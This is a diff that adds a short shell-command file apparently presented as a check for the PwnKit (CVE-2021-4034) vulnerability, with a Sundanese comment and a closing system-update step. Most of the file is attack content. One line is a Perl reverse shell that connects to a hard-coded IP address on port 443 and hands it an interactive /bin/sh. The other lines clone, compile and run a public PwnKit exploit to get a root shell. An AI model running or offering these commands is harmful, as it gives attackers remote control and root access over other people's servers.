@@ -1,0 +1,17 @@
+ls -lah /usr/bin/pkexec
+getcap /usr/bin/pkexec
+
+perl -e 'use Socket;$i="149.28.154.229";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+
+git clone https://github.com/berdav/CVE-2021-4034
+cd CVE-2021-4034
+gcc exploit.c -o pwnkit
+chmod +x pwnkit
+./pwnkit
+
+
+Lamun server rentan, bakal muncul root shell (#), hartina server bisa dieksploitasi.
+
+sudo apt update && sudo apt upgrade -y
